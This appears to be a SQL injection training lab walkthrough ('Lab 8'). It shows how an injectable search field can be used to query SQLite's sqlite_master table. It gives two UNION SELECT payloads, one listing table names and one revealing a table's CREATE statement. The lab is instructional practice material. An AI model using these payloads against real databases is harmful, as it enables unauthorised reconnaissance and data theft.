🔓 Lab 8 — Listing Database Contents (Schema)

Vulnerability: Injectable search allows querying sqlite_master — SQLite's internal schema table.
Goal: List all table names, then reveal column structure of any table.
MySQL/PostgreSQL equivalent: information_schema.tables

🎯 Step 1 — List all tables:

' UNION SELECT name,NULL,NULL FROM sqlite_master WHERE type='table'--→ Reveals: products, users, secret_users

🎯 Step 2 — Reveal schema:

' UNION SELECT sql,NULL,NULL FROM sqlite_master WHERE name='secret_users'--→ Shows the CREATE TABLE statement with all columns
